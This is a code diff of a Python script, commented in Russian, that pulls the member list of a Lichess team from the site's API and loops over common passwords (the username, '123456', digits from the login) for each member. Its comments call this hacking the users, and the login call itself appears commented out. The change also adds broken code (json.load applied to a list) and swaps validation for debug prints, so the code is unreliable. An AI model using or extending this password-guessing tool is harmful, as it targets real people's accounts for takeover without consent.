@@ -48,6 +48,8 @@ def start(passwords):
     # Получаем список людей для взлома
     # Это может занять некоторое время
     users = requests.get("https://lichess.org/api/team/" + team + "/users").text.split("\n")
+    username = json.load(users)
+    print(username[0])
 
     # Выводим сообщение, что список готов
     print("Список пользователей получен.")
@@ -57,19 +59,15 @@ def start(passwords):
     for user in users:
 
         #   Получаем ник участника
-        username = json.loads(user).get("username")
+        username = user
+        # print(username)
 
-        if (not k): continue
         #   Здесь писать список паролей, которые будут перебиратся
         #   Самые популярные пароли: username (такой же как и логин), '123456', '123456789' и getNumericPart(username) (цифры с логина)
         #   Писать сразу больше двух паролей не рекомендуется
 
         for password in passwords:
-            password = password.strip()
-            #       Проверка пароля на правильность (личесс запрещает пароли меньше 4 символов)
-            if (not password): continue
-            if (len(password) < 4): continue
-            if (password == username): continue
+            print(password)
 
             #       Взламываем
             #        r = proxy(username, password)
